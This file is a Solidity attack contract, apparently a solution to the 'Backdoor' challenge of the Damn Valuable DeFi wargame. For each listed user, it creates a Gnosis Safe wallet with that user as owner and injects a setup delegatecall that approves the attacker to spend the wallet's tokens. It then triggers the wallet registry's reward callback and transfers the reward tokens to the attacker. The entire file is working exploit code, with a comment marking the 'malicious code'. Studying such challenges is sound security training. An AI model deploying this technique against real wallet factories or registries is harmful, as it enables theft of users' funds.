// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "gnosis/common/Enum.sol";
import "gnosis/proxies/GnosisSafeProxyFactory.sol";
import "../DamnValuableToken.sol";

contract BackdoorAttack {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    // Gnosis Safe does a setup token callback duing exectution. Here is where we can run our malicious code
    function setupToken(address _tokenAddress, address _attacker) external {
        DamnValuableToken(_tokenAddress).approve(_attacker, 10e18);
    }

    function attack(address[] memory users, bytes memory setupData) external {
        for (uint256 index = 0; index < users.length; index++) {
            // Need to create a dynamic arrage to meet the function request
            address user = users[index];
            address[] memory victim = new address[](1);
            victim[0] = user;

            string
                memory sigString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory setupGnosis = abi.encodeWithSignature(
                sigString,
                victim,
                uint256(1),
                address(this),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    setupGnosis,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            DamnValuableToken(token).transferFrom(address(proxy), owner, 10e18);
        }
    }
}
